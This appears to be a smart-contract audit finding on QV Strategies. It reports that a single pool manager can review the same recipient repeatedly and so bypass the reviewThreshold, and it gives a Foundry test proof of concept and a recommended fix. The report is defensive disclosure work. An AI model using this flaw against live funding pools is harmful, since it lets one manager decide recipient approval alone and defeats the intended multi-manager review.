# Same pool manager can review the same recipient multiple times in QV Strategies
Same pool manager can review the same recipient multiple times in QV Strategies.
## Vulnerability Detail
A pool manager can review the same recipient multiple times, which shouldn't be possible, since there is no check of it. As one of the developers told me in Discord when asking him about this: _that shouldn't be possible_. Here is a PoC where the same pool manager reviews the same recipient multiple times until he gets rejected:

    function test_reviewSameRecipientsMultipleTimesFromSamePoolManager() public {
        address recipientId = __register_recipient();

        address[] memory recipientIds = new address[](1);
        recipientIds[0] = recipientId;
        IStrategy.Status[] memory Statuses = new IStrategy.Status[](1);
        Statuses[0] = IStrategy.Status.Rejected;

        vm.prank(pool_manager1());
        qvStrategy().reviewRecipients(recipientIds, Statuses);
        vm.prank(pool_manager1()); // Same pool manager reviwes the same recipientId
        qvStrategy().reviewRecipients(recipientIds, Statuses);
        vm.prank(pool_manager1()); // Same pool manager reviwes the same recipientId
        qvStrategy().reviewRecipients(recipientIds, Statuses);

        QVBaseStrategy.Recipient memory recipientRejected = qvStrategy().getRecipient(recipientId);
        assertEq(uint8(IStrategy.Status.Rejected), uint8(recipientRejected.recipientStatus));
    }
## Impact
A recipient can be _accepted_ or _rejected_ just by one pool manager, which shouldn't be possible. That is why we have the _reviewThreshold_, but it can bypassed just by reviewing it multiple times.
## Code Snippet

## Tool used

Manual Review and Foundry

## Recommendation
Create a mapping to store if a pool manager has already reviewed a recipient, in order to prevent him from reviewing it multiple times.
